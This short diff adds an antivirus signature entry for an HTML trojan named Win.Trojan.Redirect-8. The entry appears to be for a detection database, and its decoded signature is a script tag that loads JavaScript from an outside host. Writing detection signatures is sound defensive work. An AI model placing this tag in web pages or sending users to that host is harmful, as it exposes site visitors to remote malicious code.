@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Redirect-8
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+<script language=javascript src=http://cc.18dd.net/1.js></script>
